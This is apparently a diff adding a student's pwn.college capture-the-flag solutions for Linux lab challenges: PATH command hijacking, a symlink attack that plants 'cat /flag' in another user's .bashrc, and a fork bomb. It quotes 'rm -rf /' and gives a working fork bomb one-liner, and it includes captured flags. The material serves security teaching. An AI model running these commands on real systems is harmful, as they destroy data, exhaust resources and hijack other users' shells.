@@ -352,3 +352,110 @@ Untangling Users
     zardus@users~cracking-passwords:/home/hacker$ /challenge/run
     Congratulations, you have become Zardus! Here is your flag:
     pwn.college{o4JtnuF_WvCSyR-xmoEq2BEp5Su.QX3UDN1wiNxQjMyEzW}
+
+Pondering PATH
+5. Hijacking commands
+
+    Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.
+
+    How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?
+
+    - my solution:
+    hacker@path~hijacking-commands:~$ echo $PATH
+    /nix/store/l0h2dpifg7hpl6yirs5z3k8zd2wddyv3-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    hacker@path~hijacking-commands:~$ chmod a+x rm
+    hacker@path~hijacking-commands:~$ ls -l rm
+    -rwxr-xr-x 1 hacker hacker 18 Jun  9 02:18 rm
+    hacker@path~hijacking-commands:~$ PATH="/home/hacke“”
+    > ^C
+    hacker@path~hijacking-commands:~$ PATH="/home/hacker"
+    hacker@path~hijacking-commands:~$ /challenge/run
+    bash: sed: command not found
+    Trying to remove /flag...
+    pwn.college{0xn9mJ-zSMKoePNnyBhVMSbhlUy.QX3cjM1wiNxQjMyEzW}
+    hacker@path~hijacking-commands:~$ 
+    - /home/hacker/rm:
+        /usr/bin/cat /flag
+
+
+Silly Chenanigans
+
+4. Tricky Linking
+    Okay, Zardus has wised up! No more sharing the home directory: despite the reduced convenience, Zardus has moved to sharing /tmp/collab. He's made that directory world-readable and has started a list of evil commands to remember!
+
+    zardus@dojo:~$ mkdir /tmp/collab
+    zardus@dojo:~$ chmod a+w /tmp/collab
+    zardus@dojo:~$ echo "rm -rf /" > /tmp/collab/evil-commands.txt
+    In this challenge, when you run /challenge/victim, Zardus will add cat /flag to that list of commands:
+
+    hacker@dojo:~$ /challenge/victim
+
+    Username: zardus
+    Password: **********
+    zardus@dojo:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
+    zardus@dojo:~$ exit
+    logout
+
+    hacker@dojo:~$
+    Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!
+
+    You know the file to link to. Pull off the attack, and get /flag (which, for this level, Zardus can read again!).
+
+    HINT: You'll need to run /challenge/victim twice: once to get cat /flag written to where you want, and once to trigger it!
+
+    Is /tmp dangerous to use??? Despite the attack shown here, /tmp can be used safely. The directory is world-writable, but has a special permission bit set:
+
+    hacker@dojo:~$ ls -ld /tmp
+    drwxrwxrwt 29 root root 1056768 Jun  6 14:06 /tmp
+    hacker@dojo:~$
+    That t bit at the end is the sticky bit. The sticky bit means that the directory only allows the owners of files to rename or remove files in the directory. It's designed to prevent this exact attack! The problem in this challenge, of course, was that Zardus did not enable the sticky bit on /tmp/collab. This would have closed the hole in this specific case:
+
+    zardus@dojo:~$ chmod +t /tmp/collab
+    Of course, shared resources like world-writable directories are still dangerous. Much later, in the Race Conditions of the Green Belt material, you'll see many ways in which such resources can cause security issues!
+
+    - my solution:
+        hacker@shenanigans~tricky-linking:/home/zardus$ rm /tmp/collab/evil-commands.txt
+        rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
+        hacker@shenanigans~tricky-linking:/home/zardus$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
+        hacker@shenanigans~tricky-linking:/home/zardus$ /challenge/victim
+        Username: zardus
+        Password: **********
+        zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
+        zardus@shenanigans~tricky-linking:~$ exit
+        logout
+        hacker@shenanigans~tricky-linking:/home/zardus$ cat /home/zardus/.bashrc
+        this sets up a scary red shell prompt!
+        PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '
+
+        add your attack below this line!
+        cat /flag
+        hacker@shenanigans~tricky-linking:/home/zardus$ /challenge/victim
+        Username: zardus
+        Password: **********
+        pwn.college{AgyiTBlNlf91kkA7_gHtlI_sqSF.0VM0EzNxwiNxQjMyEzW}
+        zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
+        zardus@shenanigans~tricky-linking:~$ exit
+        logout
+        hacker@shenanigans~tricky-linking:/home/zardus$ 
+
+
+Daring Destruction
+1. the fork bomb
+
+As you learned in the Processes and Jobs module, whenever you start a program the Linux operating system creates a new process. If you create processes faster than the kernel can handle, the process table fills up and everything grinds to a halt. This new process (e.g., of an ls invocation) is ``forked'' off of a parent process (e.g., a shell instance). Thus, the induced explosion of processes is called a "Fork Bomb".
+
+You have the tools to do this:
+
+write a small script (like in the Chaining Commands module)
+make it executable (like in the Perceiving Permissions module)
+make it launch a copy of itself in the background (like in the Processes and Jobs module)
+and then launch another copy of itself in the background!
+Each copy will launch two more, and each of those will launch two more, and you will flood the system with so many processes that new ones will not be able to start!
+
+This challenge contains a /challenge/check that'll try to determine if your fork bomb is working (e.g., if it can't launch new processes) and give you the flag if so. Make sure to launch it (in a different terminal) before launching your attack; otherwise you won't be able to launch it!
+
+NOTE: Needless to say, this will render your environment unusable. Just restart the challenge (or start a different one) to get things back to a usable state!
+
+   - my solution (script - /home/hacker/fork_bomb)
+        #!/bin/bash
+        :(){ :|:& };:
